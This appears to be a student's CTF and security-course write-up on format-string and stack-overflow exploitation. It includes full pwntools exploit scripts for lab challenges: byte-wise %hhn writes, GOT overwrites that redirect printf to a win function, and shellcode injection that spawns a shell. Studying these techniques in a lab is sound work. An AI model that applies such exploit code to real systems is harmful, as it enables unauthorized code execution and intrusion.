> The idea behind format strings is your kinda indexing into the list of arguments to printf, however since there's only one argument you're kinda overrunning that "list" of arguments and instead reading random stuff off the stack. (%N$p is basically just rbp+8*(N+1))
Another thing thats on the stack is your buffer, so eventually one of those things in the "list" of arguments will be your buffer. However it might not be perfectly aligned with printfs idea of its arguments.
So you'll want to find where your buffer is: do AAAAAAAA%N$p until you see 0x414141414141 filling up the entire argument. If you instead see like 0x204141414141, try maybe bAAAAAAAA and see if now your A's fill up the entire thing (and maybe you need to try the next element instead)

```
e.g. in memory it might look something like
11 [AA??????]
10 [AAAAAA9F]
9  [????????]
```


## ALSR vs PIE
| Configuration                    | Code Segment Address | Heap Address | Stack Address | Security Level |
|----------------------------------|----------------------|--------------|--------------|----------------|
| ASLR Enabled, No PIE             | Fixed                | Randomized   | Randomized   | Moderate       |
| PIE Enabled, No ASLR             | Fixed                | Fixed        | Fixed        | Low            |
| ASLR Enabled + PIE Enabled       | Randomized           | Randomized   | Randomized   | High           |
| No ASLR, No PIE                  | Fixed                | Fixed        | Fixed        | Very Low       |


## meme

* compare "COMP6447" locates at rbp-0x219 with "2tRi****" load from mem for first 4 characters, so try to overwrite rbp-0x219 to 2tRi
* offset: AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p, it turns out the 8th offset is usable
* payload = b"%46c...." + b"%16$hhn."  **.** is for the aligh, 2 with ascii decimal = 50 coz have 4 dots, so need %46c which means 46 spaces and 4 dots characters be written, and we wrote 50 to the address: payload += p64(target_address)
	* why 46c: align
	
	* why %16: 

	```
	payload = (b"%46c....")    # 8th offset
	payload += (b"%16$hhn.")
	
	payload += (b"%61c....")  # t = 116 - 50 =
	payload += (b"%17$hhn.")
	
	payload += (b"%218c...")  # R = 82 - 116 + 256 =222 - 4
	payload += (b"%18$hhn.")
	
	payload += (b"%18c....")  # i = 105 - 82
	payload += (b"%19$hhn.")
	
	payload += p64(target_address)		# 16th offset
	payload += p64(target_address + 1)	# 17th offset
	payload += p64(target_address + 2)	# 18th offset
	payload += p64(target_address + 3)	# 19th offset
	```
	
	* whole script
	
	Stack Layout (From higher to lower addresses):
	
	```
	┌───────────────────────────┐
	│ target_addr               │ 16th
	├───────────────────────────┤
	│ "%19$hhn."                │	15th
	├───────────────────────────┤
	│ "%18c...."                │	14th
	├───────────────────────────┤
	│ "%18$hhn."                │	13th
	├───────────────────────────┤
	│ "%218c..."                │ 12th
	├───────────────────────────┤
	│ "%17$hhn."                │ 11th
	├───────────────────────────┤
	│ "%61c...."                │ 10th
	├───────────────────────────┤
	│ "%16$hhn."                │ 9th
	├───────────────────────────┤
	│ "%46c...."                │ 8th 

	```
	
	```
	from pwn import *

	context.arch = 'amd64'
	# if args.REMOTE:
	p = remote('6447.lol', 4003)
	# else:
	#     context.terminal = ['tmux', 'splitw', '-h']
	#     p = gdb.debug('./meme',
	#                   gdbscript='''
	#                   b *0x401310
	#                   c
	#                   ''')
	
	p.recvuntil(b'A landslide has blocked the way at ').decode('utf-8').strip()
	rdn_addr_str = p.recvline().strip(b'\n')
	print('rdn_addr_str', rdn_addr_str)
	rdn_addr = int(rdn_addr_str, 16)
	
	target_address = rdn_addr
	
	payload = (b"%46c....")
	payload += (b"%16$hhn.")
	
	payload += (b"%61c....")  # t = 116 - 50 =
	payload += (b"%17$hhn.")
	
	payload += (b"%218c...")  # R = 82 - 116 + 256 =222 - 4
	payload += (b"%18$hhn.")
	
	payload += (b"%18c....")  # i = 105 - 82
	payload += (b"%19$hhn.")
	
	payload += p64(target_address)
	payload += p64(target_address + 1)
	payload += p64(target_address + 2)
	payload += p64(target_address + 3)
	
	
	p.recvuntil(b'Speak the phrase `2tRiViAl` and I shall open:').decode('utf-8').strip()
	p.sendline(payload)
	
	p.interactive()

	```
	
	
## tetrix--its not a formatstring practice!!!

* by reverse enginnering, only s/p useful
* by wasting a long time to figure out there's no vuln in formatstring, since the format string already be controlled
* step1: inject shellcode by menu p

	```
	shellcode = asm(shellcraft.sh())
	
	print('len(shellcode):', len(shellcode))
	padding = b'\x90' * ((0x53) - len(shellcode))
	
	# step1 get stack addr
	p.sendlineafter(b'$ ', b'p\n' + padding +shellcode)
	```
	
* step2: leak the stack addr

	```
	p.recvuntil(b'Error occurred while printing flag at offset ').decode('utf-8').strip()
	rdn_addr_str = p.recvline().strip(b'\n')
	print('stack_addr', rdn_addr_str)  # 7th from rsp or rbp addr
	stack_addr = int(rdn_addr_str, 16) + 16
	```
	
* step3: buffer overflow

	```
	padding = cyclic(56, alphabet=string.ascii_uppercase, n=8).encode()
	p.sendlineafter(b'$ ', b's\n' + padding + p64(stack_addr))
	p.interactive()
	```
	
* whole script
	
	```
	from pwn import *

	context.arch = 'amd64'
	if args.REMOTE:
	    p = remote('6447.lol', 4004)
	    # p = process('./tetris')
	else:
	    # p fget pws *loop+179
	    context.terminal = ['tmux', 'splitw', '-h', '-p', '75']
	    p = gdb.debug('./tetris',
	                  gdbscript='''
	                  b *loop+179
	                  b *set_name+98
	                  c
	                  ''')
	
	# inject shellcode
	shellcode = asm(shellcraft.sh())
	print('len(shellcode):', len(shellcode))
	padding = b'\x90' * ((0x53) - len(shellcode))
	p.sendlineafter(b'$ ', b'p\n' + padding +shellcode)
	
	# leak the stack addr
	p.recvuntil(b'Error occurred while printing flag at offset ').decode('utf-8').strip()
	rdn_addr_str = p.recvline().strip(b'\n')
	print('stack_addr', rdn_addr_str)  # 7th from rsp or rbp addr
	stack_addr = int(rdn_addr_str, 16) + 16
	
	# bufferfly
	padding = cyclic(56, alphabet=string.ascii_uppercase, n=8).encode()
	p.sendlineafter(b'$ ', b's\n' + padding + p64(stack_addr))
	
	p.interactive()

	```
	
## formatrix

* checksec： NO PIE
	
	| Attribute                          | Detailed Description                                                                                                                |
|------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------|
| **Architecture**                   | The binary is for a 64-bit architecture and uses little-endian byte ordering, where the least significant byte is stored first.     |
| **RELRO**                          | No `RELRO` protection is enabled. When `Full RELRO` is enabled, the Global Offset Table (GOT) becomes read-only, preventing attacks like GOT overwriting. Without `RELRO`, the GOT is writable at runtime, making it vulnerable. |
| **Stack Canary**                   | Stack canaries help detect stack buffer overflow attacks by placing a known value (canary) before the return address on the stack. If the canary is altered, it indicates a buffer overflow, and the program terminates. Without stack canaries, the binary is vulnerable to stack overflow attacks. |
| **NX (No-eXecute)**                | `NX` marks memory regions like the stack and data segments as non-executable, preventing injected shellcode from being executed. With `NX enabled`, typical buffer overflow attacks that inject and execute shellcode are more difficult to perform. |
| <span style="color:red">**PIE (Position Independent Executable)**</span> | <span style="color:red">Without `PIE`, the binary's code and data segments are loaded at fixed addresses, making them predictable targets for ROP attacks. With `PIE`, addresses are randomized each time the binary is executed, making it harder for attackers to predict addresses of functions or gadgets.</span> |
| **Shadow Stack (SHSTK)**           | SHSTK is an additional stack that stores return addresses separately. It compares the return address on the shadow stack with the one on the normal stack to detect tampering. If a mismatch is detected, the program will terminate, protecting against return address manipulation attacks. |
| **Indirect Branch Tracking (IBT)** | IBT adds control-flow integrity checks for indirect branches (e.g., `call` or `jmp` instructions) to prevent attackers from redirecting execution to unintended or malicious code. |
| **Stripped**                       | The binary is not stripped, meaning it still contains debugging symbols and function names. This makes it easier to analyze and debug, but it also reveals more information to attackers. |

* overwrite printf addr to win addr by exploiting sprintf, since printf no vulns
* offset: 5th, but buffer shifts from rbp-0x200 -> rbp-0x600 between fgets and sprintf, 1024bytes, which means: the newer offset should be 5 + 1024/8 = 133.

* script

	```
	# printf: 0x403580
	# win: 0x4011d6
	
	
	from pwn import *
	
	context.arch = 'amd64'
	if args.REMOTE:
	    p = remote('6447.lol', 4001)
	    # p = process('./formatrix')
	else:
	    # p fget pws *loop+179
	    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
	    p = gdb.debug('./formatrix',
	                  gdbscript='''
	                  b *0x401319
	                  c
	                  ''')
	
	# win_addr = p64(0x4011d6)
	prinf_addr_str = "0x403580"
	prinf_int = int(prinf_addr_str, 16)
	
	# payload = b"%134$lln"
	# payload += p64(prinf_int)
	
	payload = (b"%211c...")  # 133th -> 214 -> 0xd6
	payload += (b"%143$hhn")  # 134th
	
	payload += (b"%55c....")  # 135th -> 0x11 + 256 -214 = 59 -> 0x11
	payload += (b"%144$hhn")  # 136
	
	payload += (b"%43c....")  # 137th -> 0x40 - 0x11 =  47
	payload += (b"%145$hhn")  # 138
	
	payload += (b"%189c...")  # 139th -> 0x00 + 256 - 0x40 = 192
	payload += (b"%146$hhn")  # 140th
	
	payload += (b"%147$hhn")  # 141th
	payload += (b"%148$hhn")  # 142th
	
	payload += p64(prinf_int)  # 143
	payload += p64(prinf_int + 1)  # 144
	payload += p64(prinf_int + 2)  # 145
	payload += p64(prinf_int + 3)  # 146
	payload += p64(prinf_int + 4)  # 147
	payload += p64(prinf_int + 5)  # 148
	
	print('payload:', payload)
	
	p.sendlineafter(b': ', payload)
	
	p.interactive()
	
	```
	
	
## ftx

#### writeup

* checksec: RELRO: No RELRO means we can overwrite GOT， allowing us to redirect `printf` to another function like `win`. & PIE: PIE enabled, so function addresses are randomized at runtime. The base address needs to be calculated dynamically.
* The vulnerability is located in the `do_gamble` function, where a user-controllable format string is passed to `printf`:

	```
	00001fba  488d85d0fdffff     lea     rax, [rbp-0x230 {format}]
	00001fc1  4889c7             mov     rdi, rax {format}
	00001fc4  b800000000         mov     eax, 0x0
	00001fc9  e8b2f0ffff         call    printf
	```

* redirecting printf to win via Format String Vulnerability

	* offset
	
		```
		# got the offset = 8
		for i in range(10):
			p.sendlineafter('Press any key to continue...', b'\nc')
			p.sendlineafter("what's your handle?", '%{}$p'.format(i + 1).encode())
			gamble()
		```
	* get the addr of player name
	
		```
		p.recvuntil(b"Hello friend, welcome to FTX. what's your handle?")
	p.sendline(b"%1$p")
		```
	
	* get the offset to printf
	
		- calculating the offset by look at the got table & the addr of player name which is 640
	
	* get the offset to win func
		- gdb: info address win by substract the addr of player name which is 12351
		
		-  or by the printf in code offset is 0x4258 - the win in the code offset is 0x1219 = 12351
	* payload 
	
		```
		payload = fmtstr_payload(offset=8, writes={printf_addr: win_addr})
		```
		
#### pwnscript

```
import math
from pwn import *


def is_fibonacci(num):
    def is_perfect_square(n):
        return int(math.sqrt(n)) ** 2 == n

    return is_perfect_square(5 * num * num + 4) or is_perfect_square(5 * num * num - 4)


def hextoint(hex):
    return int(hex, 16)


def gamble(debug=True):
    p.recvuntil(b"What will you do?")
    p.sendline(b"g\n")
    line = p.recvuntil(b"): ")
    try:
        decoded_line = line.decode('utf-8')
    except UnicodeDecodeError:
        decoded_line = line.decode('latin-1')

    max_value = float(decoded_line.split("max")[1].strip("(): "))
    bet_value = max_value / 2
    # print('bet_value: ', bet_value)
    p.sendline(str(bet_value).encode())
    #
    p.recvuntil(b"*** GAMBLE ***")
    p.recvline()

    options = []
    for i in range(10):
        if len(options) == 5:
            break
        line = p.recvline().decode()
        if ')' in line:
            num = int(line.split(')')[1].strip())
            # print('num: ', num)
            options.append(num)

    non_fib = None
    for num in options:
        if not is_fibonacci(num):
            non_fib = num
            break
    #
    if non_fib is not None:
        p.sendline(str(options.index(non_fib) + 1).encode())

    if debug:
        line = p.recvuntil(b"succubus.").decode()
        match = re.search(r'Well done, (.*?)!', line)
        if match:
            value = match.group(1).strip()
            print(f"line {line}\nExtracted value: {value}\n")
            return value
        return None


context.arch = 'amd64'
if args.REMOTE:
    p = remote('6447.lol', 4002)
elif args.HOST:
    p = process('./ftx')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./ftx',
                  gdbscript='''
                  b *do_gamble+449
                  c
                  ''')

p.recvuntil(b"Hello friend, welcome to FTX. what's your handle?")
p.sendline(b"%1$p")
ret = gamble()
printf_addr = hextoint(ret) - 640
win_addr = printf_addr - 12351
print('printf_addr', hex(printf_addr))
print('win_addr', hex(win_addr))

payload = fmtstr_payload(offset=8, writes={
    printf_addr: win_addr
})

## got the offset = 8
# for i in range(10):
# # overwrite printf addr
#     p.sendlineafter('Press any key to continue...', b'\nc')
#     p.sendlineafter("what's your handle?", '%{}$p'.format(i + 1).encode())
#     gamble()

p.sendlineafter('Press any key to continue...', b'c')
p.sendlineafter('What will you do?', b'c')
print(payload)
p.sendlineafter("what's your handle?", payload)

gamble(False)

p.interactive()

```